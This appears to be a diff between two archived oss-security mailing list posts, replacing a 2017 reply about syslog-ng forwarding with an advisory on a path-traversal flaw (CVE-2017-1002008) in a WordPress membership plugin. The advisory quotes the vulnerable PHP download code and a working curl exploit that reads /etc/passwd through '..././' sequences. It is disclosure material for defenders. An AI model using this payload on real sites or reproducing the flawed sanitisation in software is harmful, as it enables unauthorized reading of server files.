@@ -1,33 +1,48 @@
 X-Archive-Source: openwall-scrape
-X-Archive-Source-URL: https://www.openwall.com/lists/oss-security/2017/08/01/10
-Message-ID: <CABOeKPFALNQqQvDOdAuCc6HNC7eEoshjneyiu-0euhThiuv-8g@mail.gmail.com>
-Date: Tue, 1 Aug 2017 13:40:45 -0700
-From: Sean Cassidy <sean@...ensestorm.com>
-To: oss-security@...ts.openwall.com
-Subject: Re: Syslog forwarding with IP spoofing
+X-Archive-Source-URL: https://www.openwall.com/lists/oss-security/2017/03/14/5
+Message-id: <59CD5258-22E2-46F1-83AF-EE4B78EFD88D@me.com>
+Date: Tue, 14 Mar 2017 16:33:34 -0400
+From: "Larry W. Cashdollar" <larry0@...com>
+To: Open Source Security <oss-security@...ts.openwall.com>
+Subject: Arbitrary file download vulnerability in Wordpress Plugin Membership Simplified v1.58
 Content-Type: text/plain; charset=utf-8
 
-On Tue, Aug 1, 2017 at 7:27 AM, Александр Носарев <nosarev-ay@...bler.ru> wrote:
->
-> Good day!
->
->
-> I need to recive syslog messages, filter them and send them forward to the SIEM.
->
-> Also HOST field is not represented in syslog, so i need to spoof IP of forwarding
-> packets to bind messages recived by SIEM to it's original source IP.
->
-> If i will try to add some marks to syslog message, I will need to override
-> parsers for each syslog source type, so it seems like abad idea.
->
-> Is there any open source tool for that task?
+Title: Arbitrary file download vulnerability in Wordpress Plugin Membership Simplified v1.58
+Author: Larry W. Cashdollar, @_larry0
+Date: 2017-03-13
+CVE-ID:[CVE-2017-1002008]
+Download Site: https://wordpress.org/plugins/membership-simplified-for-oap-members-only
+Vendor: https://profiles.wordpress.org/williamdeangelis/
+Vendor Notified: 2017-03-13
+Vendor Contact: plugins@...dpress.org
+Advisory: http://www.vapidlabs.com/advisory.php?v=187
+Description: Membership Simplified allows you to generate membership lessons with templated content to create a unified look and feel throughout your courses.
+Vulnerability:
+The file download code located membership-simplified-for-oap-members-only/download.php does check whether a user is logged in and has download privledges, the code on line 5 that checks the path can be defeated by using a ..././ pattern to get the desired ../ after being passed through the str_replace() function:
 
-I would use syslog-ng for this. It can rewrite syslog messages
-(including adding/modifying the HOST field) and then do nearly
-anything with the result. You can have it call a program, put it on an
-AMQP queue, write it to disk, or whatever, really.
+ 3 $path = substr(getcwd(), 0, -50). "uploads/membership-simplified-for-oap-members-only/"; // change the path to fit your websites document structure
+  4 $fullPath = $path.$_GET['download_file'];
+  5 $fullPath = str_replace("../","",$fullPath);
+  6 
+  7 if ($fd = fopen($fullPath, "r")) {
+  8     $fsize = filesize($fullPath);
+  9     $path_parts = pathinfo($fullPath);
+ 10     $ext = strtolower($path_parts["extension"]);
+ 11     switch ($ext) {
+ 12         case "pdf":
+ 13         header("Content-type: application/pdf"); // add here more headers for d    iff. extensions
+ 14         header("Content-Disposition: attachment; filename=\"".$path_parts["base    name"]."\""); // use 'attachment' to force a download
+ 15         break;
+ 16         default;
+ 17         header("Content-type: application/octet-stream");
+ 18         header("Content-Disposition: filename=\"".$path_parts["basename"]."\"")    ;
+ 19     }
+ 20     header("Content-length: $fsize");
+ 21     header("Cache-control: private"); //use this to open files directly
+ 22     while(!feof($fd)) {
+ 23         $buffer = fread($fd, 2048);
+ 24         echo $buffer;
 
-https://www.balabit.com/documents/syslog-ng-ose-latest-guides/en/syslog-ng-ose-guide-admin/html/chapter-manipulating-messages.html
-https://www.balabit.com/documents/syslog-ng-ose-latest-guides/en/syslog-ng-ose-guide-admin/html/chapter-destinations.html
-
-Sean
+Exploit Code:
+	• $ curl http://example.com/wordpress/wp-content/plugins/membership-simplified-for-oap-members-only/download.php?download_file=..././..././..././..././..././..././..././..././etc/passwd
+	•  
